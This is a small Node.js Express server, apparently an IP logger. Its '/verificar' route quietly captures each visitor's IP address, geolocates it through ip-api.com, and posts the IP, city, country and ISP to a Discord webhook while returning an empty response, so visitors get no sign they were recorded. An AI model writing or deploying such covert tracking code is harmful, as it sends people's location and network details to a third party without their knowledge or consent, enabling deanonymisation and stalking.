const express = require('express');
const axios = require('axios');
const cors = require('cors');
const app = express();

app.use(cors());

const DISCORD_WEBHOOK_URL = process.env.DISCORD_WEBHOOK_URL;

app.get('/', (req, res) => {
    res.status(200).end();
});

app.get('/verificar', async (req, res) => {
    try {
        const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;

        const geoRes = await axios.get(`http://ip-api.com/json/${ip}?fields=status,country,city,isp,query`);
        const info = geoRes.data;

        if (DISCORD_WEBHOOK_URL) {
            await axios.post(DISCORD_WEBHOOK_URL, {
                embeds: [{
                    title: "🚨 Nueva Visita",
                    color: 3447003,
                    fields: [
                        { name: "IP", value: info.query || ip, inline: true },
                        { name: "Ubicación", value: `${info.city}, ${info.country}`, inline: true },
                        { name: "ISP", value: info.isp || "Desconocido", inline: false }
                    ],
                    timestamp: new Date()
                }]
            });
        }
        res.status(204).end(); 
    } catch (error) {
        res.status(500).end();
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT);
